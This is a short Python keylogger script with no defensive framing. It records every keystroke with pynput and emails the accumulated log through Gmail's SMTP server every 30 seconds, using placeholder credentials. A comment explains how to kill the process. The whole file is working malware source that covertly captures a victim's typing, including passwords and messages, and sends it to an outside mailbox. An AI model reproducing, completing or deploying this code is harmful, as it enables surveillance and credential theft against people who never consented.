import pynput.keyboard
import smtplib
import threading

# if you wanna stop this app
# write 'killall python' on terminal
# I used gmail to send email in this app

log= ''
def callback_function(key) :
    global log
    try :
        #log = log + str(key.char)
        log = log +key.char.encode('utf-8')
    except AttributeError :
        if key == key.space :
            log = log + str(' ')
        elif key == key.enter :
            log = log+ str('\n')
        else :
            log = log
    #print(log)

def send_mail(email,password,message):
    global log
    print(log)
    email_service = smtplib.SMTP("smtp.gmail.com",587)
    email_service.starttls()
    email_service.login(email,password)
    email_service.sendmail(email,email,message)
    email_service.quit()

# thread - threading

def threading_function ():
    global log
    send_mail("email@gmail.com", "password", log)
    log = ""
    timer_object = threading.Timer(30,threading_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press= callback_function)
with keylogger_listener :
    threading_function()
    keylogger_listener.join()
